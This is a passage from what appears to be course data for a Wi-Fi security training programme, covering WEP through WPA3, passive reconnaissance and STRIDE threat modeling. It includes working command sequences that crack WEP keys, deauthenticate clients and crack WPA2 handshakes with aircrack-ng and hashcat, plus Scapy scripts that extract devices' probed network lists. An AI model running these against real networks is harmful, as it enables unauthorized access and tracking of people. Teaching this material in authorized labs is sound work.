            objectives: [
              "Recognize and exploit insecure legacy standards like Open and WEP.",
              "Differentiate between WPA2-PSK and WPA2-Enterprise and understand their respective attack surfaces.",
              "Understand the cryptographic improvements in WPA3 (SAE) and the critical role of Protected Management Frames (PMF).",
              "Identify and exploit the risks associated with WPA2/WPA3 transition modes and misconfigurations.",
            ],
            content: {
              overview:
                "The security posture of a Wi-Fi network is fundamentally defined by its authentication and encryption standard. This lesson provides a practical, in-depth exploration of Wi-Fi security evolution—from the cryptographically broken WEP to the modern WPA3. You will learn not just to identify these protocols, but to understand their inherent weaknesses, practical attack vectors, and appropriate hardening measures for a professional security assessment.",
              sections: [
                {
                  title:
                    "The Evolution of Wi-Fi Security: From Broken to Modern",
                  content:
                    "<p>Understanding these protocols is the first step in attacking or defending them.</p><h3>Open Networks (No Security)</h3><ul><li><strong>Description:</strong> No authentication or encryption. All data is transmitted in cleartext.</li><li><strong>Attack Vector:</strong> Passive eavesdropping is trivial. Any data transmitted can be captured and read with a packet analyzer like Wireshark. An attacker can also create an 'Evil Twin' access point with the same SSID to perform Man-in-the-Middle (MitM) attacks.</li><li><strong>Hardening:</strong> Avoid entirely for any sensitive traffic. If necessary, use a VPN to create a secure tunnel over the insecure medium.</li></ul><h3>WEP (Wired Equivalent Privacy) - Broken</h3><ul><li><strong>Description:</strong> The original security standard, using the RC4 stream cipher and a static key.</li><li><strong>Core Flaws:</strong> 1) <strong>Short IV (Initialization Vector):</strong> 24-bit IVs are reused frequently, statistically guaranteed after ~5,000 packets. 2) <strong>Weak Key Scheduling:</strong> Fluhrer, Mantin, and Shamir (FMS) attack exploits weaknesses in the RC4 key scheduling algorithm. 3) <strong>Static Keys:</strong> The shared secret rarely changes, allowing an attacker unlimited time to collect packets for cryptanalysis.</li><li><strong>Attack Vector:</strong> Using tools like `aireplay-ng` to accelerate packet capture (ARP injection/replay) and `aircrack-ng` to crack the key from a sufficient number of IVs. A WEP key can often be cracked in minutes.</li><li><strong>Hardening:</strong> WEP is irreparably broken. It must be disabled and replaced immediately.</li></ul><h3>WPA2-PSK (Wi-Fi Protected Access 2 - Pre-Shared Key)</h3><ul><li><strong>Description:</strong> The long-standing standard for home/small office networks. Uses AES-CCMP encryption and a shared passphrase.</li><li><strong>How it Works:</strong> The PSK is combined with the network's SSID to generate a Pairwise Master Key (PMK) using the PBKDF2 function. The 4-way handshake then establishes a session key for encryption.</li><li><strong>Attack Vector:</strong> The weakness is not in the encryption itself (AES is strong) but in the key. An attacker can capture the 4-way handshake and perform an offline dictionary or brute-force attack against the passphrase. Tools like `aircrack-ng` and `hashcat` are used for this. Weak passphrases are vulnerable.</li><li><strong>Hardening:</strong> Use a long, complex, and random passphrase (≥20 characters). This makes offline cracking computationally infeasible.</li></ul><h3>WPA2-Enterprise (802.1X/EAP)</h3><ul><li><strong>Description:</strong> The standard for corporate and large-scale deployments. Requires a RADIUS server for authentication. Users have unique credentials (username/password, certificates).</li><li><strong>How it Works:</strong> The AP acts as a pass-through, forwarding authentication requests to the RADIUS server. The Extensible Authentication Protocol (EAP) defines the authentication method (e.g., PEAP, EAP-TLS, EAP-TTLS).</li><li><strong>Attack Vector:</strong> Attacks target the specific EAP method or credential stealing. This includes evil twin attacks to harvest credentials and attacks against weaker EAP types like EAP-MD5 or misconfigured PEAP that doesn't validate the server certificate.</li><li><strong>Hardening:</strong> Use certificate-based EAP methods like EAP-TLS, which provides mutual authentication. Ensure the RADIUS server's certificate is validated by clients.</li></ul><h3>WPA3 (The Modern Standard)</h3><ul><li><strong>Description:</strong> Introduces two key features to address WPA2's shortcomings.</li><li><strong>SAE (Simultaneous Authentication of Equals):</strong> Replaces the PSK handshake with a Dragonfly handshake. This is resistant to offline dictionary attacks because the handshake is cryptographic and does not reveal information useful for offline cracking. It also provides Forward Secrecy.</li><li><strong>Mandatory PMF:</strong> Protected Management Frames are required, mitigating deauthentication/disassociation attacks.</li><li><strong>Attack Vector:</strong> WPA3 is significantly more robust. Current attacks are often against early implementations (Dragonblood vulnerabilities) or focus on downgrade attacks to WPA2.</li><li><strong>Hardening:</strong> Transition to WPA3-only mode if all clients support it. Avoid using WPA3 transition mode indefinitely.</li></ul>",
                },
                {
                  title: "Protected Management Frames (PMF) & Transition Modes",
                  content:
                    "<p>PMF and network transition states are critical areas for both attack and defense.</p><h3>Protected Management Frames (PMF / 802.11w)</h3><ul><li><strong>Description:</strong> Cryptographically protects unicast and multicast management frames (Deauthentication, Disassociation, Action frames) from forgery and spoofing.</li><li><strong>Modes:</strong> 1) <strong>Capable:</strong> The AP supports PMF but does not require it. 2) <strong>Required:</strong> The AP will only allow connections from clients that support PMF.</li><li><strong>Security Impact:</strong> Renders common denial-of-service attacks (deauth floods) ineffective against compliant clients. This is a major step forward in network stability and security.</li></ul><h3>WPA2/WPA3 Transition Mode</h3><ul><li><strong>Description:</strong> An AP configuration that supports both WPA2 and WPA3 simultaneously, allowing legacy clients to connect while newer clients use the more secure standard.</li><li><strong>Security Risk:</strong> This creates a downgrade attack surface. An attacker can forcibly deauthenticate a WPA3-capable client and, during reassociation, spoof messages to make the client believe the AP's WPA3 capabilities are disabled. The client may then fall back to WPA2, making it vulnerable to offline PSK cracking. This is a primary reason why transition mode should be a temporary migration state, not a permanent configuration.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title: "1. Cracking WEP with Aircrack-ng Suite",
                  description:
                    "This practical example demonstrates exploiting the fundamental flaws in WEP.",
                  code: "# Step 1: Start the interface in monitor mode on the target channel (e.g., 6)\nsudo airmon-ng start wlan0 6\n\n# Step 2: Use airodump-ng to capture data and target a specific BSSID\n# We write to a file 'wep_capture'\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon\n\n# Step 3: Use aireplay-ng to generate traffic and accelerate IV collection\n# Fake authentication to associate with the AP (optional but helpful)\nsudo aireplay-ng -1 0 -e TargetSSID -a AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon\n\n# ARP request replay attack: wait for an ARP packet and replay it to generate new IVs\n# This is the most common and effective attack\nsudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h 00:11:22:33:44:55 wlan0mon\n\n# Step 4: Run aircrack-ng to crack the key once enough IVs are captured (~5k-50k)\n# It will automatically detect the key length (64/128/256-bit)\nsudo aircrack-ng wep_capture-01.cap",
                },
                {
                  title:
                    "2. Capturing a WPA2 4-Way Handshake for Offline Cracking",
                  description:
                    "The first step in attacking WPA2-PSK is capturing the cryptographic handshake.",
                  code: "# Step 1: Start airodump-ng to capture handshakes on the target network\nsudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon\n\n# Step 2: Force a client to reauthenticate by sending a deauthentication packet\n# This will cause the client to perform the 4-way handshake again, which we can capture\n# -0 1: Send 1 deauth packet. -a: AP MAC. -c: Client MAC (use 'FF:FF:FF:FF:FF:FF' for broadcast)\nsudo aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon\n\n# Step 3: Airodump-ng will display 'WPA handshake' in the top right when captured\n\n# Step 4: Crack the handshake using aircrack-ng and a wordlist\nsudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_capture-01.cap\n\n# Alternatively, convert the capture to a format for Hashcat (much faster on GPU)\n# Use hcxpcapngtool (from the hcxtools package) to convert the capture\nhcxpcapngtool -o wpa_hash.hc22000 wpa_capture-01.cap\n\n# Crack with hashcat using mode 22000 (WPA-PBKDF2-PMKID+EAPOL)\nhashcat -m 22000 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt",
                },
                {
                  title: "3. Advanced PMF Analysis with Scapy",
                  description:
                    "This script provides a deeper analysis of the RSN capabilities in beacon frames, specifically for PMF.",
                  code: 'from scapy.all import *\nfrom scapy.layers.dot11 import Dot11, Dot11Elt\n\ndef analyze_rsn_pmf(pcap_file):\n    """\n    Analyzes a pcap for Beacon and Probe Response frames to extract RSNE and \n    determine PMF (802.11w) status: Disabled, Capable, or Required.\n    """\n    print(f"[+] Analyzing RSN capabilities for PMF in: {pcap_file}")\n    networks = {}\n\n    packets = rdpcap(pcap_file)\n    for pkt in packets:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and (pkt.subtype == 8 or pkt.subtype == 5): # Beacon or Probe Response\n            bssid = pkt.addr2\n            ssid = ""\n            rsn_info = None\n            \n            # Iterate through information elements\n            elt = pkt.getlayer(Dot11Elt)\n            while isinstance(elt, Dot11Elt):\n                if elt.ID == 0: # SSID\n                    try:\n                        ssid = elt.info.decode(\'utf-8\', errors=\'ignore\')\n                    except:\n                        ssid = "<Hidden>"\n                elif elt.ID == 48: # RSN Information Element\n                    rsn_info = elt.info\n                elt = elt.payload.getlayer(Dot11Elt)\n            \n            if ssid and rsn_info and len(rsn_info) >= 18:\n                # The RSN Capabilities field is the last 2 bytes\n                rsn_caps = int.from_bytes(rsn_info[-2:], byteorder=\'little\')\n                pmf_capable = (rsn_caps & 0x0040) != 0  # Check bit 6\n                pmf_required = (rsn_caps & 0x0080) != 0  # Check bit 7\n                \n                if pmf_required:\n                    pmf_status = "Required"\n                elif pmf_capable:\n                    pmf_status = "Capable"\n                else:\n                    pmf_status = "Disabled"\n                \n                # Store the first seen status per BSSID\n                if bssid not in networks:\n                    networks[bssid] = {\'SSID\': ssid, \'PMF\': pmf_status}\n    \n    # Print results\n    print(f"\\n{\'BSSID\':<18} {\'SSID\':<20} {\'PMF Status\'}")\n    print("-" * 50)\n    for bssid, info in networks.items():\n        print(f"{bssid:<18} {info[\'SSID\']:<20} {info[\'PMF\']}")\n\n# Execute the analysis\nanalyze_rsn_pmf(\'capture.pcap\')',
                },
              ],
              activities: [
                {
                  title: "Security Protocol Identification & Attack Planning",
                  description:
                    "1. Using `airodump-ng` or a similar tool, scan your lab environment. 2. Create a spreadsheet cataloguing each discovered network with the following columns: BSSID, SSID, Channel, Security Protocol (OPEN, WEP, WPA2, WPA3, WPA2/WPA3), and PMF Status (if available). 3. For each network, list the primary attack vector you would use against it (e.g., 'WEP -> ARP replay attack + aircrack-ng', 'WPA2-PSK -> Handshake capture + dictionary attack', 'Open -> Evil Twin').",
                },
                {
                  title: "Handshake Capture & Cracking Lab",
                  description:
                    "In your isolated lab: 1. Set up an AP with WPA2-PSK and a weak password (e.g., 'password123'). 2. Use the code examples above to capture the 4-way handshake by forcing a deauthentication. 3. Successfully crack the password using both `aircrack-ng` and `hashcat` (if available). 4. Repeat the exercise with a strong password (e.g., 20+ random characters) and observe the time difference, understanding the practical limits of cracking.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "What is the fundamental cryptographic flaw that makes WEP irreparably broken?",
                  options: [
                    "It uses the AES cipher which was cracked.",
                    "Its 24-bit Initialization Vector (IV) is too short and gets reused, allowing statistical attacks to recover the key.",
                    "It requires a password that is too long to be practical.",
                    "It only works on the 2.4 GHz band.",
                  ],
                  correct: 1,
                  explanation:
                    "The short 24-bit IV space guarantees reuse. When IVs are reused with the same static key, it enables attacks like the Fluhrer, Mantin, and Shamir (FMS) attack to recover the WEP key by analyzing the resulting ciphertexts.",
                },
                {
                  id: 2,
                  question:
                    "An attacker captures a WPA2 4-way handshake. What can they do with it?",
                  options: [
                    "Immediately decrypt all future traffic from the client.",
                    "Use it to recover the Pre-Shared Key (PSK) via an offline brute-force or dictionary attack.",
                    "Use it to connect to the network without knowing the password.",
                    "Use it to force the AP to change its password.",
                  ],
                  correct: 1,
                  explanation:
                    "The handshake contains a cryptographic nonce and message integrity codes that are derived from the PMK. The PMK is itself derived from the PSK and SSID. An attacker can take this captured handshake and, offline, test millions of potential passwords per second to see if one generates the same PMK and matches the handshake.",
                },
                {
                  id: 3,
                  question:
                    "What is the primary security risk of leaving an access point in WPA2/WPA3 Transition Mode indefinitely?",
                  options: [
                    "It halves the network's maximum speed.",
                    "It creates a downgrade attack surface, allowing an attacker to force capable clients onto the less secure WPA2 protocol.",
                    "It causes constant deauthentications for all clients.",
                    "It requires all clients to use certificates.",
                  ],
                  correct: 1,
                  explanation:
                    "Transition mode is meant to be a temporary bridge during migration. Its primary risk is that it maintains support for the older, vulnerable WPA2 protocol. An attacker can exploit this by spoofing messages to trick a WPA3-capable client into downgrading its connection to WPA2, making it susceptible to offline PSK cracking attacks.",
                },
                {
                  id: 4,
                  question:
                    "What is the key security improvement that WPA3's SAE (Simultaneous Authentication of Equals) handshake provides over WPA2's PSK handshake?",
                  options: [
                    "It uses a shorter password.",
                    "It is resistant to offline dictionary attacks because the handshake does not expose information useful for password verification outside of the session.",
                    "It encrypts the SSID of the network.",
                    "It allows for faster roaming between access points.",
                  ],
                  correct: 1,
                  explanation:
                    "The WPA2 4-way handshake reveals a message integrity code (MIC) that an attacker can use to verify password guesses offline. The SAE handshake is a cryptographic exchange based on zero-knowledge principles, meaning an eavesdropper cannot obtain any data that would help them test passwords offline. This forces attackers into much slower online attacks.",
                },
              ],
            },
          },
          {
            id: "lesson-4",
            title: "Wireless Recon (Passive & Legitimate)",
            duration: "90 min",
            objectives: [
              "Master the techniques of passive wireless reconnaissance without transmitting any packets.",
              "Interpret the complete information contained within beacon frames and probe responses to build network intelligence.",
              "Identify weak security configurations, network misconfigurations, and privacy leaks through passive analysis alone.",
              "Recognize client device behaviors and fingerprint devices based on their probing characteristics.",
              "Document findings in a professional reconnaissance report format.",
            ],
            content: {
              overview:
                "Passive reconnaissance is the cornerstone of ethical wireless security assessment. By merely listening to the radio spectrum, an analyst can build a detailed picture of the wireless environment, identify security weaknesses, and detect potentially rogue devices—all without sending a single packet that could be detected or considered intrusive. This lesson focuses on the art of listening, interpreting the constant broadcast of management frames, and turning this data into actionable intelligence while maintaining complete operational stealth.",
              sections: [
                {
                  title: "The Science of Passive Scanning",
                  content:
                    "<p>Unlike active scanning, which transmits probe requests, passive scanning places the wireless adapter in monitor mode to silently capture all frames on a given channel or set of channels. This is undetectable by network intrusion detection systems (NIDS) and is the preferred method for the initial phase of any assessment.</p><h3>Key Tools for Passive Recon:</h3><ul><li><strong>Airodump-ng:</strong> The industry standard for passive scanning. Provides a real-time view of networks (BSSIDs) and connected clients (STATIONS).</li><li><strong>Kismet:</strong> A powerful wireless sniffer and intrusion detection system that logs all traffic to disk for later analysis and can detect hidden networks and passive clients.</li><li><strong>Wireshark/TShark:</strong> For deep packet inspection and analysis of captured traffic (PCAP files).</li></ul><h3>Beacon Frame Analysis: The AP's Identity Card</h3><p>Beacon frames are broadcast by Access Points typically 10 times per second. They are a treasure trove of information, contained within tagged 'Information Elements' (IEs).</p><ul><li><strong>SSID (IE 0):</strong> The network name. A null SSID indicates a 'hidden' network, though this is a weak form of security through obscurity.</li><li><strong>Supported Rates (IE 1):</strong> The data rates the AP supports. Can hint at the AP's age and capabilities.</li><li><strong>DSSS Parameter Set (IE 3):</strong> Contains the current channel number.</li><li><strong>RSN (Robust Security Network) (IE 48):</strong> The most important IE for security analysis. It details the authentication and encryption suites supported (e.g., WPA2-PSK, WPA2-Enterprise), as well as the status of Protected Management Frames (PMF).</li><li><strong>Vendor Specific IEs (IE 221):</strong> Contain information about vendor-specific features. The most notable is the Wi-Fi Protected Setup (WPS) IE, which can indicate if the easily exploitable WPS feature is enabled.</li><li><strong>HT/VHT/HE Capabilities (IEs 45, 61, 95):</strong> Detail support for Wi-Fi 4 (802.11n), Wi-Fi 5 (802.11ac), and Wi-Fi 6/6E (802.11ax) features like channel width (40, 80, 160 MHz) and MIMO capabilities.</li></ul><p>By analyzing these IEs, an attacker can build a target profile: <em>'ACME-Corp' on channel 36, WPA2-PSK with WPS enabled, and capable of 80 MHz channels. This is a high-value target with a known attack vector (WPS).</em></p>",
                },
                {
                  title: "Probe Requests: The Client's Tell",
                  content:
                    "<p>While APs broadcast beacons, client devices broadcast Probe Requests to discover networks they wish to connect to. This behavior is a significant privacy leak and a key source of intelligence.</p><h3>Privacy Implications:</h3><ul><li><strong>Preferred Network Lists (PNL):</strong> Probe requests contain the SSIDs of networks the device has previously connected to. Capturing these can reveal a user's home network, workplace, favorite coffee shop, etc. This can be used for highly targeted social engineering or to create a compelling evil twin attack.</li><li><strong>Device Fingerprinting:</strong> The MAC address in the probe request (unless randomized) uniquely identifies the device. Even with MAC randomization (common in modern OSes), the specific order of requested SSIDs and other frame characteristics can often fingerprint a device model or OS.</li></ul><h3>Operational Security (OPSEC) Takeaway:</h3><p>Clients are constantly shouting their history and preferences into the void. This underscores why connecting to 'Open' networks is dangerous—an attacker can easily set up an evil twin for any SSID in your device's PNL.</p>",
                },
                {
                  title: "Building a Network Threat Profile",
                  content:
                    "<p>Passive recon allows you to score networks based on their advertised security posture before launching a single active attack.</p><ul><li><strong>High-Risk Indicators:</strong> Open networks, WEP, WPS enabled, hidden SSIDs, lack of PMF support.</li><li><strong>Medium-Risk Indicators:</strong> WPA2-PSK with a potentially weak password (based on company name, etc.), transition mode (WPA2/WPA3).</li><li><strong>Low-Risk Indicators:</strong> WPA3-only with PMF required, WPA2-Enterprise.</li><li><strong>Rogue AP Detection:</strong> Identifying unauthorized APs (e.g., a 'Home' SSID in a corporate environment) or ad-hoc (IBSS) networks, which are often strictly against policy.</li></ul>",
                },
              ],
              codeExamples: [
                {
                  title: "1. Advanced Passive Survey with Airodump-ng",
                  description:
                    "Using airodump-ng to conduct a thorough, multi-channel passive survey and log all data for later analysis.",
                  code: "# Put card in monitor mode\nsudo airmon-ng start wlan0\n\n# Perform a passive survey on both 2.4 and 5 GHz bands, hopping channels, and write to a file.\n# This is the most common starting command for a full assessment.\nsudo airodump-ng -w passive_survey --output-format pcap,csv,kismet wlan0mon\n\n# To focus on a specific band and channel width for deeper analysis:\n# Survey 5 GHz band, include DFS channels, use 80 MHz channel width for better reception\nsudo airodump-ng -w 5ghz_survey -b a --bandwidth 80 --output-format pcap,csv wlan0mon\n\n# After stopping airodump-ng, you will have:\n# - passive_survey-01.cap : The packet capture file\n# - passive_survey-01.csv : Summary of networks in CSV format\n# - passive_survey-01.kismet.csv : Kismet-compatible network summary",
                },
                {
                  title: "2. Deep Beacon Analysis with Python (Scapy)",
                  description:
                    "This script provides a professional-grade analysis of a beacon capture, extracting and interpreting key Information Elements.",
                  code: "from scapy.all import *\nfrom scapy.layers.dot11 import Dot11, Dot11Elt\nimport sys\n\ndef deep_beacon_analysis(pcap_file):\n    \"\"\"Performs a deep analysis of beacon frames, extracting all key IEs.\"\"\"\n    print(f\"[+] Performing deep beacon analysis on: {pcap_file}\")\n    \n    networks = {}\n    \n    try:\n        packets = rdpcap(pcap_file)\n    except Exception as e:\n        print(f\"[-] Could not read PCAP file: {e}\")\n        return\n    \n    for pkt in packets:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 8: # Beacon\n            bssid = pkt.addr2\n            if bssid not in networks:\n                networks[bssid] = {'ssid': 'Unknown', 'channel': 0, 'security': 'Open/WEP', 'wps': False, 'pmf': 'N/A', 'rates': [], 'vendor': 'Unknown'}\n            \n            elt = pkt.getlayer(Dot11Elt)\n            while isinstance(elt, Dot11Elt):\n                # SSID\n                if elt.ID == 0:\n                    try:\n                        networks[bssid]['ssid'] = elt.info.decode('utf-8', errors='ignore')\n                    except:\n                        networks[bssid]['ssid'] = '<Hidden>'\n                # Supported Rates\n                elif elt.ID == 1:\n                    networks[bssid]['rates'] = [f\"{r*0.5:.1f} Mbps\" for r in elt.info]\n                # Current Channel\n                elif elt.ID == 3:\n                    networks[bssid]['channel'] = ord(elt.info)\n                # RSN Information\n                elif elt.ID == 48:\n                    networks[bssid]['security'] = 'WPA2/WPA3'\n                    # Check for PMF in RSN Capabilities (last 2 bytes)\n                    if len(elt.info) >= 18:\n                        rsn_caps = int.from_bytes(elt.info[-2:], byteorder='little')\n                        pmf_capable = (rsn_caps & 0x0040) != 0\n                        pmf_required = (rsn_caps & 0x0080) != 0\n                        if pmf_required:\n                            networks[bssid]['pmf'] = 'Required'\n                        elif pmf_capable:\n                            networks[bssid]['pmf'] = 'Capable'\n                        else:\n                            networks[bssid]['pmf'] = 'Disabled'\n                # Vendor Specific - Check for WPS\n                elif elt.ID == 221 and elt.info.startswith(b'\\x00P\\xf2\\x04'):\n                    networks[bssid]['wps'] = True\n                # Vendor - OUI from MAC can be used to guess AP manufacturer\n                elif bssid not in networks:\n                    networks[bssid]['vendor'] = lookup_oui(bssid) # Implement OUI lookup\n                \n                elt = elt.payload.getlayer(Dot11Elt)\n    \n    # Print a formatted report\n    print(f\"\\n{'BSSID':<18} {'SSID':<25} {'Ch':<3} {'Security':<12} {'WPS':<5} {'PMF':<10} {'Rates'}\")\n    print(\"-\" * 90)\n    for bssid, data in networks.items():\n        print(f\"{bssid:<18} {data['ssid'][:24]:<25} {data['channel']:<3} {data['security']:<12} {data['wps']:<5} {data['pmf']:<10} {', '.join(data['rates'][:2])}...\")\n\n# Example OUI lookup function (simplified)\ndef lookup_oui(mac_addr):\n    oui = mac_addr.upper().replace(':', '')[:6]\n    # In a real script, you'd query a local OUI database file\n    oui_db = {'AABBCC': 'VendorA', 'A0B1C2': 'VendorB'}\n    return oui_db.get(oui, 'Unknown')\n\n# Execute the analysis\ndeep_beacon_analysis('passive_survey-01.cap')",
                },
                {
                  title: "3. Analyzing Probe Requests for PNL Extraction",
                  description:
                    "This script parses a capture file to extract probe requests and build a list of networks each client is searching for, revealing their PNL.",
                  code: "from scapy.all import *\nfrom scapy.layers.dot11 import Dot11, Dot11Elt\n\ndef analyze_probe_requests(pcap_file):\n    \"\"\"Analyzes probe requests to build client preference lists.\"\"\"\n    print(f\"[+] Analyzing probe requests in: {pcap_file}\")\n    \n    client_profiles = {}\n    \n    packets = rdpcap(pcap_file)\n    for pkt in packets:\n        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 4: # Probe Request\n            client_mac = pkt.addr2\n            ssid = \"\"\n            \n            # Extract the SSID from the probe request\n            elt = pkt.getlayer(Dot11Elt)\n            while isinstance(elt, Dot11Elt):\n                if elt.ID == 0: # SSID parameter set\n                    try:\n                        ssid = elt.info.decode('utf-8', errors='ignore')\n                    except:\n                        ssid = \"<Broadcast>\" # Empty info field means broadcast probe\n                    break\n                elt = elt.payload.getlayer(Dot11Elt)\n            \n            # Initialize the client's profile if new\n            if client_mac not in client_profiles:\n                client_profiles[client_mac] = {'ssids_searched': set()}\n            \n            # Add the SSID to the client's set of searched networks\n            if ssid:\n                client_profiles[client_mac]['ssids_searched'].add(ssid)\n    \n    # Print the results\n    print(\"\\nClient Device Probe Analysis:\")\n    print(\"-\" * 50)\n    for client, data in client_profiles.items():\n        ssid_list = ', '.join(sorted(data['ssids_searched'])[:5]) # Show first 5\n        if len(data['ssids_searched']) > 5:\n            ssid_list += f\"... (+{len(data['ssids_searched'])-5} more)\"\n        print(f\"Client: {client} -> Searched for: {ssid_list}\")\n\n# Run the analysis\nanalyze_probe_requests('passive_survey-01.cap')",
                },
              ],
              activities: [
                {
                  title: "Comprehensive Passive Reconnaissance Report",
                  description:
                    "1. Using your lab environment or an authorized testing area, perform a 15-minute passive capture using `airodump-ng` on both 2.4 GHz and 5 GHz bands. 2. Use the provided Python scripts to analyze the resulting PCAP file. 3. Produce a professional report containing: an executive summary, a table of all discovered APs with their BSSID, SSID, channel, security type, WPS status, and PMF status; a list of observed clients and their probed SSIDs (PNL); and a risk assessment section highlighting the 3 most vulnerable networks and your reasoning.",
                },
                {
                  title: "Client Behavior Analysis",
                  description:
                    "1. Set up your lab with multiple devices (e.g., an Android phone, an iPhone, a Windows laptop, a MacBook). 2. Perform a passive capture for 10 minutes while these devices are powered on. 3. Analyze the capture to see which SSIDs each device probes for. 4. Attempt to identify each device based solely on its probing behavior and MAC address (or randomization pattern). Document your findings and the characteristics that helped you fingerprint each device.",
                },
              ],
            },
            quiz: {
              passingScore: 80,
              questions: [
                {
                  id: 1,
                  question:
                    "During a passive assessment, you observe a beacon frame with an RSN Information Element (ID 48) where the RSN Capabilities field has bit 7 set. What does this indicate?",
                  options: [
                    "The network is using WEP encryption.",
                    "The network supports WPS.",
                    "The network requires Protected Management Frames (PMF) for all connections.",
                    "The network is a mesh network.",
                  ],
                  correct: 2,
                  explanation:
                    "In the RSN Capabilities field, bit 7 indicates that Management Frame Protection (PMF) is 'Required'. This means the AP will only allow connections from clients that support PMF, a key security feature of WPA3 and a strong configuration for WPA2.",
                },
                {
                  id: 2,
                  question:
                    "You capture a probe request from a client MAC `AA:BB:CC:DD:EE:FF` that contains an empty SSID field. What is the most likely explanation?",
                  options: [
                    "The client is trying to connect to a hidden SSID.",
                    "The client is performing a broadcast probe to discover any available network.",
                    "The packet is corrupted.",
                    "The client is running a legacy operating system that doesn't support SSIDs.",
                  ],
                  correct: 1,
                  explanation:
                    "A probe request with an empty SSID field is a broadcast probe. The client is asking 'Is anyone out there?' and will associate with any AP that responds with a probe response. This is common behavior for devices looking to quickly populate a list of available networks.",
                },
                {
                  id: 3,
                  question:
                    "Why is passive reconnaissance considered a 'safe' first step in a wireless security assessment from a legal and operational perspective?",
                  options: [
                    "It is undetectable because it does not transmit any frames that could be logged by an AP or wireless IDS.",
                    "It is the fastest way to discover networks.",
                    "It allows you to crack WPA2 passwords instantly.",
                    "It is the only method that works on 5 GHz networks.",
                  ],
                  correct: 0,
                  explanation:
                    "The defining characteristic of passive reconnaissance is that it involves only listening. Since no packets are transmitted, there is no way for the target network to detect the reconnaissance activity. This makes it a legally and operationally safe way to gather initial intelligence without alerting the target.",
                },
                {
                  id: 4,
                  question:
                    "A client device is observed probing for the SSIDs 'HomeNet', 'Starbucks', 'Airport-Free-WiFi', and 'ACME-Corp'. What is the primary security risk associated with this behavior?",
                  options: [
                    "It will drain the device's battery faster.",
                    "An attacker can use this list to create a targeted 'Evil Twin' access point for any of these SSIDs, increasing the chance of a successful Man-in-the-Middle attack.",
                    "It means the device is already infected with malware.",
                    "It violates FCC regulations on transmitter power.",
                  ],
                  correct: 1,
                  explanation:
                    "The list of probed SSIDs (Preferred Network List) is a serious privacy leak. An attacker can set up a rogue AP with one of these familiar SSIDs (e.g., 'Starbucks'). The victim's device, trusting that network, may automatically connect to it, putting all its traffic through the attacker's system.",
                },
              ],
            },
          },
          {
            id: "lesson-5",
            title: "Threat Modeling for WLANs",
            duration: "90 min",
            objectives: [
              "Apply and adapt the STRIDE threat model specifically to wireless network architectures and protocols.",
              "Identify and profile common attacker personas targeting WLANs, including external, internal, and supply chain threats.",
              "Map wireless assets, data flows, and trust boundaries to systematically identify potential attack surfaces.",
              "Develop a risk assessment matrix to prioritize wireless threats based on impact, likelihood, and attacker motivation.",
              "Design targeted mitigation strategies for high-priority wireless threats.",
            ],
            content: {
              overview:
                "Effective wireless security begins not with tools, but with mindset. Threat modeling provides a structured framework to anticipate, identify, and prioritize potential attacks before they occur. This lesson moves beyond generic threat modeling to focus specifically on the unique attack vectors, assets, and adversaries present in wireless environments. You will learn to think like both an attacker and a defender, systematically breaking down a wireless network to uncover its vulnerabilities and design appropriate defensive controls.",
              sections: [
                {
                  title: "STRIDE Model Applied to Wireless Networks",
                  content:
                    "<p>The STRIDE model, developed by Microsoft, categorizes six fundamental types of threats. We will adapt each category to the specific context of Wi-Fi.</p><h3>Spoofing (Impersonation)</h3><ul><li><strong>Wireless Manifestation:</strong> An attacker masquerades as a legitimate entity.</li><li><strong>Examples:</strong> 1) <strong>Evil Twin / Rogue AP:</strong> Spoofing the SSID and BSSID of a legitimate network. 2) <strong>MAC Spoofing:</strong> Impersonating an authorized client's MAC address to bypass MAC filtering. 3) <strong>EAP Identity Response Spoofing:</strong> In WPA2-Enterprise, impersonating a user to initiate a connection attempt.</li><li><strong>Mitigations:</strong> 802.1X for client and server authentication, certificate-based EAP methods (EAP-TLS), strong WPA3-PSK (SAE), Wireless Intrusion Detection/Prevention Systems (WIDS/WIPS).</li></ul><h3>Tampering (Modification)</h3><ul><li><strong>Wireless Manifestation:</strong> An attacker alters data in transit.</li><li><strong>Examples:</strong> 1) <strong>Management Frame Injection:</strong> Forging deauthentication/disassociation frames to disrupt connectivity. 2) <strong>Data Packet Modification:</strong> On open or WEP networks, modifying the payload of data frames. 3) <strong>Jamming:</strong> Physically tampering with the RF medium to cause denial of service.</li><li><strong>Mitigations:</strong> Protected Management Frames (PMF/802.11w), strong encryption (WPA2/WPA3), RF spectrum monitoring.</li></ul><h3>Repudiation (Non-repudiation)</h3><ul><li><strong>Wireless Manifestation:</strong> A user denies performing an action, and there is no way to prove otherwise.</li><li><strong>Examples:</strong> 1) <strong>Shared Key Repudiation:</strong> On a WPA2-PSK network, any user with the password could perform malicious actions, and it would be impossible to attribute them to a specific individual. 2) <strong>MAC Spoofing:</strong> An attacker using a spoofed MAC can perform actions that are logged under an innocent user's identity.</li><li><strong>Mitigations:</strong> WPA2-Enterprise with individual user credentials, centralized logging and auditing, NAC (Network Access Control) solutions.</li></ul><h3>Information Disclosure (Data Exposure)</h3><ul><li><strong>Wireless Manifestation:</strong> Exposure of sensitive information to unauthorized individuals.</li><li><strong>Examples:</strong> 1) <strong>Eavesdropping:</strong> Capturing unencrypted traffic on open networks. 2) <strong>Probe Request Sniffing:</strong> Harvesting a device's Preferred Network List (PNL), revealing geographic and behavioral patterns. 3) <strong>WPS PIN Recovery:</strong> Exposing the WPS PIN, which can lead to network password compromise.</li><li><strong>Mitigations:</strong> Strong encryption (WPA3), client-side VPNs for open networks, disabling WPS, MAC address randomization on clients.</li></ul><h3>Denial of Service (Availability)</h3><ul><li><strong>Wireless Manifestation:</strong> An attack that disrupts access to the network or its resources.</li><li><strong>Examples:</strong> 1) <strong>Layer 2 DoS:</strong> Deauthentication/Disassociation floods targeting specific clients or broadcast 